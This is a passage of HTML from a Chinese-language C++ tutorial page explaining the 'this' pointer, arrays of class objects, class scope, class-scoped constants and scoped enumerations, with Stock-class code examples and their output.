class="comment">// 调用 stock1.topval，传入 stock2</span></span><br><span class="line">                                              <span class="comment">// 内部比较 s(stock2).total_val 和 this(stock1)-&gt;total_val</span></span><br><span class="line">                                              <span class="comment">// 因为 stock2 价值更高，返回 stock2 的引用</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nTop value stock:\n&quot;</span>;</span><br><span class="line">    top.show(); <span class="comment">// 显示的是 stock2 的信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>this-&gt;total_val</code> 明确表示访问的是调用 <code>topval</code> 函数的那个对象（<code>stock1</code>）的 <code>total_val</code> 成员，而 <code>s.total_val</code> 访问的是作为参数传递进来的对象（<code>stock2</code>）的 <code>total_val</code>。<code>return *this;</code> 则返回了调用对象 <code>stock1</code> 本身的引用。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>  <code>this</code> 是一个指向<strong>调用对象</strong>的指针，在非静态成员函数内部可用。</li><li>  它使得成员函数能够访问和操作调用它的那个特定对象的数据成员和成员函数。</li><li>  大多数情况下，<code>this</code> 的使用是隐式的。</li><li>显式使用 <code>this</code> 主要用于：<ul><li>  区分同名的参数和数据成员。</li><li>  从成员函数中返回调用对象自身的引用或指针（常用于方法链）。</li></ul></li><li>  <code>this</code> 指针的类型取决于成员函数是否为 <code>const</code>。</li></ul><h2 id="10-5-对象数组"><a href="#10-5-对象数组" class="headerlink" title="10.5 对象数组"></a>10.5 对象数组</h2><p>就像可以创建 <code>int</code>、<code>double</code> 或 <code>char</code> 的数组一样，你也可以创建<strong>类对象</strong>的数组。数组的每个元素都是一个该类的对象。</p><h3 id="声明对象数组"><a href="#声明对象数组" class="headerlink" title="声明对象数组"></a>声明对象数组</h3><p>声明对象数组的语法与声明基本类型数组类似：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassName arrayName[numberOfElements];</span><br></pre></td></tr></table></figure><p>例如，要创建一个包含 4 个 <code>Stock</code> 对象的数组：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// 假设 Stock 类定义在此</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> STKS = <span class="number">4</span>;</span><br><span class="line">Stock myStocks[STKS]; <span class="comment">// 创建一个包含 4 个 Stock 对象的数组</span></span><br></pre></td></tr></table></figure><h3 id="构造函数的调用"><a href="#构造函数的调用" class="headerlink" title="构造函数的调用"></a>构造函数的调用</h3><p>当程序创建对象数组时，它需要为数组中的<strong>每个元素（对象）</strong>调用构造函数。</p><ul><li><p><strong>默认构造函数:</strong> 如果在声明数组时<strong>没有</strong>为元素提供显式的初始化值，程序将为数组中的<strong>每个元素</strong>调用类的**默认构造函数 (Default Constructor)**。</p><ul><li>  在上面的例子 <code>Stock myStocks[STKS];</code> 中，<code>Stock::Stock()</code> 这个默认构造函数将被调用 4 次，为 <code>myStocks[0]</code>, <code>myStocks[1]</code>, <code>myStocks[2]</code>, <code>myStocks[3]</code> 这四个对象进行初始化。</li><li>  <strong>重要:</strong> 如果类<strong>没有</strong>默认构造函数（例如，你只定义了带参数的构造函数，而没有定义无参数的构造函数或使用 <code>= default</code>），那么尝试创建像 <code>Stock myStocks[STKS];</code> 这样的未初始化数组将导致<strong>编译错误</strong>。</li></ul></li><li><p><strong>带参数的构造函数:</strong> 你可以在声明数组时使用初始化列表来为数组元素指定不同的构造函数调用。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> STKS = <span class="number">2</span>;</span><br><span class="line">Stock portfolio[STKS] = &#123;</span><br><span class="line">    Stock(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">12</span>, <span class="number">20.0</span>), <span class="comment">// 调用 Stock(const string&amp;, long, double)</span></span><br><span class="line">    Stock(<span class="string">&quot;Boffo Objects&quot;</span>, <span class="number">200</span>, <span class="number">2.0</span>) <span class="comment">// 调用 Stock(const string&amp;, long, double)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 及以后版本可以使用更简洁的列表初始化</span></span><br><span class="line">Stock investments[] = &#123; <span class="comment">// 编译器会自动计算数组大小 (3)</span></span><br><span class="line">    Stock(<span class="string">&quot;Fleep Co&quot;</span>, <span class="number">5</span>, <span class="number">15.5</span>),</span><br><span class="line">    Stock(), <span class="comment">// 调用默认构造函数 Stock()</span></span><br><span class="line">    Stock(<span class="string">&quot;MacroHard&quot;</span>, <span class="number">18</span>, <span class="number">75.0</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><p>  在 <code>portfolio</code> 数组的例子中，<code>portfolio[0]</code> 使用提供的参数调用 <code>Stock(const string&amp;, long, double)</code> 构造函数，<code>portfolio[1]</code> 也一样。</p></li><li><p>  在 <code>investments</code> 数组的例子中，<code>investments[0]</code> 和 <code>investments[2]</code> 调用带参数的构造函数，而 <code>investments[1]</code> 则显式调用了默认构造函数 <code>Stock()</code>。</p></li><li><p>如果初始化列表提供的初始值数量<strong>少于</strong>数组大小，则剩余的元素将使用<strong>默认构造函数</strong>进行初始化。如果类没有默认构造函数，这将导致编译错误。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Stock funds[<span class="number">4</span>] = &#123;</span><br><span class="line">    Stock(<span class="string">&quot;A Corp&quot;</span>, <span class="number">10</span>, <span class="number">1.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;B Ltd&quot;</span>, <span class="number">20</span>, <span class="number">2.0</span>)</span><br><span class="line">    <span class="comment">// funds[2] 和 funds[3] 将使用默认构造函数 Stock() 初始化</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="访问对象数组成员"><a href="#访问对象数组成员" class="headerlink" title="访问对象数组成员"></a>访问对象数组成员</h3><p>访问数组中对象的成员与访问基本类型数组元素类似，先用索引 <code>[]</code> 选择数组中的特定对象，然后使用点号 <code>.</code> 访问该对象的公有成员（数据或函数）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> STKS = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用初始化列表创建并初始化数组</span></span><br><span class="line">    Stock stocks[STKS] = &#123;</span><br><span class="line">        Stock(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">12</span>, <span class="number">20.0</span>),</span><br><span class="line">        Stock(<span class="string">&quot;Boffo Objects&quot;</span>, <span class="number">200</span>, <span class="number">2.0</span>),</span><br><span class="line">        Stock(<span class="string">&quot;Monolithic Obelisks&quot;</span>, <span class="number">130</span>, <span class="number">3.25</span>),</span><br><span class="line">        Stock(<span class="string">&quot;Fleep Enterprises&quot;</span>, <span class="number">60</span>, <span class="number">6.5</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stock holdings:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> st;</span><br><span class="line">    <span class="keyword">for</span> (st = <span class="number">0</span>; st &lt; STKS; st++) &#123;</span><br><span class="line">        stocks[st].show(); <span class="comment">// 调用数组中第 st 个对象的 show() 方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到价值最高的股票 (使用上一节的 topval 假设它已添加)</span></span><br><span class="line">    <span class="comment">// 注意：topval 需要添加到 Stock 类中才能编译</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    const Stock* top = &amp;stocks[0]; // 假设第一个是最高的</span></span><br><span class="line"><span class="comment">    for (st = 1; st &lt; STKS; st++) &#123;</span></span><br><span class="line"><span class="comment">        top = &amp;top-&gt;topval(stocks[st]); // 比较并更新 top 指针</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    std::cout &lt;&lt; &quot;\nMost valuable holding:\n&quot;;</span></span><br><span class="line"><span class="comment">    top-&gt;show(); // 显示价值最高的股票信息</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改数组中某个对象的状态</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nBuying more Boffo Objects...\n&quot;</span>;</span><br><span class="line">    stocks[<span class="number">1</span>].buy(<span class="number">50</span>, <span class="number">2.5</span>); <span class="comment">// 调用 stocks[1] 对象的 buy() 方法</span></span><br><span class="line">    stocks[<span class="number">1</span>].show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>输出示例 (假设 <code>topval</code> 部分被注释掉):</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Constructor using NanoSmart called</span><br><span class="line">Constructor using Boffo Objects called</span><br><span class="line">Constructor using Monolithic Obelisks called</span><br><span class="line">Constructor using Fleep Enterprises called</span><br><span class="line">Stock holdings:</span><br><span class="line">Company: NanoSmart  Shares: 12</span><br><span class="line">  Share Price: $20.000  Total Worth: $240.00</span><br><span class="line">Company: Boffo Objects  Shares: 200</span><br><span class="line">  Share Price: $2.000  Total Worth: $400.00</span><br><span class="line">Company: Monolithic Obelisks  Shares: 130</span><br><span class="line">  Share Price: $3.250  Total Worth: $422.50</span><br><span class="line">Company: Fleep Enterprises  Shares: 60</span><br><span class="line">  Share Price: $6.500  Total Worth: $390.00</span><br><span class="line"></span><br><span class="line">Buying more Boffo Objects...</span><br><span class="line">Company: Boffo Objects  Shares: 250</span><br><span class="line">  Share Price: $2.500  Total Worth: $625.00</span><br><span class="line">Bye, Fleep Enterprises!</span><br><span class="line">Bye, Monolithic Obelisks!</span><br><span class="line">Bye, Boffo Objects!</span><br><span class="line">Bye, NanoSmart!</span><br></pre></td></tr></table></figure><p>注意：程序结束时，数组 <code>stocks</code> 中的每个对象的析构函数都会被调用（按与构造相反的顺序）。</p><h3 id="动态对象数组"><a href="#动态对象数组" class="headerlink" title="动态对象数组"></a>动态对象数组</h3><p>你也可以使用 <code>new</code> 来创建动态的对象数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> size = <span class="number">5</span>;</span><br><span class="line">Stock *portfolio = <span class="keyword">new</span> Stock[size]; <span class="comment">// 创建包含 5 个 Stock 对象的动态数组</span></span><br></pre></td></tr></table></figure><ul><li><p>  <strong>默认构造函数要求:</strong> 使用 <code>new ClassName[size]</code> 这种形式时，<strong>必须</strong>要求类具有可访问的<strong>默认构造函数</strong>，因为它会为数组中的每个元素调用默认构造函数。</p></li><li><p><strong>C++11 列表初始化 (可选):</strong> C++11 允许在使用 <code>new</code> 创建数组时提供初始化列表，这样可以调用特定的构造函数，并且如果提供了所有元素的初始化值，则不强制要求默认构造函数。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++11 or later</span></span><br><span class="line">Stock *p_list = <span class="keyword">new</span> Stock[<span class="number">3</span>] &#123;</span><br><span class="line">    Stock(<span class="string">&quot;X Inc&quot;</span>, <span class="number">1</span>, <span class="number">1.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;Y Ltd&quot;</span>, <span class="number">2</span>, <span class="number">2.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;Z LLC&quot;</span>, <span class="number">3</span>, <span class="number">3.0</span>)</span><br><span class="line">&#125;;</span><br><span class="line">Stock *p_partial = <span class="keyword">new</span> Stock[<span class="number">4</span>] &#123;</span><br><span class="line">    Stock(<span class="string">&quot;A&quot;</span>, <span class="number">1</span>, <span class="number">1.0</span>),</span><br><span class="line">    Stock(<span class="string">&quot;B&quot;</span>, <span class="number">2</span>, <span class="number">2.0</span>)</span><br><span class="line">    <span class="comment">// p_partial[2] 和 p_partial[3] 需要默认构造函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>  <strong>访问:</strong> 访问动态数组成员可以使用数组表示法 <code>portfolio[i].member</code> 或指针表示法 <code>(portfolio + i)-&gt;member</code>。</p></li><li><p><strong>释放内存:</strong> 必须使用 <code>delete []</code> 来释放动态分配的对象数组，以确保每个对象的析构函数都被正确调用。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> [] portfolio; <span class="comment">// 调用 5 次析构函数，然后释放内存</span></span><br><span class="line"><span class="keyword">delete</span> [] p_list;</span><br><span class="line"><span class="keyword">delete</span> [] p_partial;</span><br></pre></td></tr></table></figure><p>  <strong>错误:</strong> 使用 <code>delete portfolio;</code> 只会调用第一个元素的析构函数，并可能导致内存泄漏或未定义行为。</p></li></ul><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li>  可以像创建基本类型数组一样创建对象数组。</li><li>  创建对象数组时，会为每个元素调用构造函数。</li><li>  如果未提供显式初始化，则调用默认构造函数。因此，对于未初始化的数组或使用 <code>new ClassName[size]</code> 创建的动态数组，类必须有可访问的默认构造函数。</li><li>  可以使用初始化列表为数组成员指定不同的构造函数。</li><li>  通过 <code>arrayName[index].member</code> 的方式访问数组成员。</li><li>  动态对象数组使用 <code>new ClassName[size]</code> 创建，并必须使用 <code>delete [] arrayPtr</code> 释放。</li></ul><h2 id="10-6-类作用域"><a href="#10-6-类作用域" class="headerlink" title="10.6 类作用域"></a>10.6 类作用域</h2><p>我们已经知道，在函数内部或代码块内部定义的变量具有局部作用域（块作用域）。类似地，在类中定义的名称（数据成员、成员函数、嵌套类型、枚举等）也有其特定的作用域，称为**类作用域 (Class Scope)**。</p><p><strong>类作用域的规则:</strong></p><ol><li> <strong>内部可见性:</strong> 在类声明或成员函数定义内部，可以直接访问类的成员（数据成员、成员函数、枚举等），无需特殊限定。</li><li> <strong>外部访问限制:</strong> 在类的外部，不能直接访问类的成员。必须通过对象（使用点号 <code>.</code> 或箭头 <code>-&gt;</code>）或者通过类名和作用域解析运算符 <code>::</code>（对于静态成员、嵌套类型或枚举）来访问。</li><li> <strong>名称隔离:</strong> 类作用域意味着在一个类内部定义的名称不会与在另一个类或全局作用域中定义的同名名称冲突。例如，两个不同的类可以都有一个名为 <code>count</code> 的数据成员。</li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> count; <span class="comment">// ClassA 的 count</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123; value = <span class="number">10</span>; &#125; <span class="comment">// 可以直接访问 value</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value; <span class="comment">// ClassA 的 value</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">double</span> count; <span class="comment">// ClassB 的 count (与 ClassA::count 不冲突)</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">calculate</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_count = <span class="number">100</span>; <span class="comment">// 全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ClassA objA;</span><br><span class="line">    ClassB objB;</span><br><span class="line"></span><br><span class="line">    objA.count = <span class="number">1</span>; <span class="comment">// 访问 ClassA 对象的 count 成员</span></span><br><span class="line">    objB.count = <span class="number">2.5</span>; <span class="comment">// 访问 ClassB 对象的 count 成员</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误！不能直接访问类内部的名称</span></span><br><span class="line">    <span class="comment">// count = 5; // 访问哪个 count？ </span></span><br><span class="line">    <span class="comment">// value = 20; // 错误！value 在类作用域内</span></span><br><span class="line"></span><br><span class="line">    objA.process(); <span class="comment">// 通过对象调用成员函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>作用域解析运算符 <code>::</code></strong></p><p>当我们需要在类外部引用类作用域内的名称时（例如，在定义成员函数或访问静态成员时），就需要使用类名和作用域解析运算符 <code>::</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在类外部定义成员函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClassA::process</span><span class="params">()</span> </span>&#123; <span class="comment">// 使用 ClassA:: 指明 process 属于 ClassA</span></span><br><span class="line">    value = <span class="number">10</span>; <span class="comment">// 在成员函数内部，可以直接访问其他成员</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;count = <span class="number">5</span>; <span class="comment">// 也可以显式使用 this</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-6-1-作用域为类的常量"><a href="#10-6-1-作用域为类的常量" class="headerlink" title="10.6.1 作用域为类的常量"></a>10.6.1 作用域为类的常量</h3><p>有时，我们希望在类中定义一个常量，这个常量对于该类的所有对象来说都是一样的，并且可能在编译时就需要知道它的值（例如，用于指定数组大小）。</p><p>有几种方法可以在类作用域内创建常量：</p><ol><li><p><strong><code>static const</code> 成员 (整型或枚举类型 - C++11 前常用):</strong><br> 对于整型（<code>int</code>, <code>char</code>, <code>bool</code> 等）或枚举类型的常量，可以在类定义内部使用 <code>static const</code> 直接初始化。<code>static</code> 意味着这个常量属于类本身，而不是任何特定对象（所有对象共享同一个常量），<code>const</code> 意味着它的值不能被修改。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bakery</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 这个常量属于类，所有对象共享</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> Months = <span class="number">12</span>; <span class="comment">// 声明并初始化静态常量成员</span></span><br><span class="line">    <span class="keyword">double</span> costs[Months];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：如果需要在类外部获取该常量的地址，</span></span><br><span class="line"><span class="comment">// 或者编译器要求（较旧的编译器可能需要），</span></span><br><span class="line"><span class="comment">// 可能还需要在源文件中提供一个定义（不带初始值）：</span></span><br><span class="line"><span class="comment">// const int Bakery::Months; // 可选的定义</span></span><br></pre></td></tr></table></figure><p> 这种方式不能用于初始化非整型或非枚举类型的静态常量。</p></li><li><p><strong><code>static constexpr</code> 成员 (C++11 及以后):</strong><br> C++11 引入了 <code>constexpr</code>，它允许在编译时计算常量表达式。使用 <code>static constexpr</code> 可以定义各种类型的类作用域常量，只要初始化表达式是常量表达式即可。这是现代 C++ 中定义类常量的推荐方式。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">int</span> MaxUsers = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">double</span> Rate = <span class="number">1.5</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">const</span> <span class="keyword">char</span>* DefaultMsg = <span class="string">&quot;Welcome&quot;</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> userLimit = Config::MaxUsers; <span class="comment">// 直接使用类名访问</span></span><br><span class="line">    <span class="keyword">double</span> currentRate = Config::Rate;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>static constexpr</code> 成员默认是内联的，通常不需要在类外部再次定义。</p></li><li><p><strong>枚举技巧 (Enum Hack - C++11 前的变通方法):</strong><br> 在 C++11 之前，如果想在类中定义一个非整型的常量（或者只是想避免 <code>static const</code> 可能需要的外部定义），有时会使用匿名枚举。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LegacyBox</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MaxSize = <span class="number">100</span> &#125;; <span class="comment">// 枚举技巧</span></span><br><span class="line">    <span class="keyword">int</span> items[MaxSize]; <span class="comment">// 使用枚举量作为数组大小</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p> <code>MaxSize</code> 就像一个值为 100 的整型常量，但它是一个枚举量。这种方法现在已不常用，<code>static constexpr</code> 是更好的选择。</p></li></ol><h3 id="10-6-2-作用域内枚举-Scoped-Enumerations-C-11"><a href="#10-6-2-作用域内枚举-Scoped-Enumerations-C-11" class="headerlink" title="10.6.2 作用域内枚举 (Scoped Enumerations - C++11)"></a>10.6.2 作用域内枚举 (Scoped Enumerations - C++11)</h3><p>传统的 C++ 枚举（<code>enum</code>）存在一些问题：</p><ul><li>  <strong>名称冲突:</strong> 枚举量（enumerators）被放置在与枚举定义相同的作用域中，容易与其他名称（包括其他枚举的枚举量）发生冲突。</li><li>  <strong>隐式转换:</strong> 枚举量可以隐式地转换为整型，有时这可能导致逻辑错误或降低类型安全性。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">OldColor</span> &#123;</span> RED, GREEN, BLUE &#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">StopLight</span> &#123;</span> RED, YELLOW, GREEN &#125;; <span class="comment">// 错误！RED 和 GREEN 重定义</span></span><br><span class="line"></span><br><span class="line">OldColor myColor = RED; <span class="comment">// OK</span></span><br><span class="line"><span class="keyword">int</span> colorValue = myColor; <span class="comment">// OK, 隐式转换为 int (值为 0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (myColor == <span class="number">0</span>) &#123; <span class="comment">/* ... */</span> &#125; <span class="comment">// 可以和整数比较</span></span><br></pre></td></tr></table></figure><p>为了解决这些问题，C++11 引入了**作用域内枚举 (Scoped Enumerations)**，使用 <code>enum class</code> 或 <code>enum struct</code> 关键字定义。</p><p><strong>特点:</strong></p><ol><li> <strong>作用域限制:</strong> 枚举量的作用域被限制在枚举本身内部。访问枚举量必须使用枚举名称和作用域解析运算符 <code>::</code>。</li><li> <strong>无隐式转换:</strong> 作用域内枚举类型不能隐式地转换为整型或其他类型。如果需要转换，必须使用显式类型转换（如 <code>static_cast</code>）。</li><li> <strong>类型安全:</strong> 增强了类型安全性，不同作用域枚举类型的值不能直接比较（除非重载了比较运算符）。</li><li> <strong>可指定底层类型:</strong> 可以显式指定枚举使用的底层整数类型（默认为 <code>int</code>）。</li></ol><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">EnumName</span> :</span> UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;</span><br><span class="line"><span class="comment">// 或者 enum struct (功能相同)</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">struct</span> <span class="title">EnumName</span> :</span> UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;</span><br><span class="line"><span class="comment">// : UnderlyingType 是可选的</span></span><br></pre></td></tr></table></figure><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 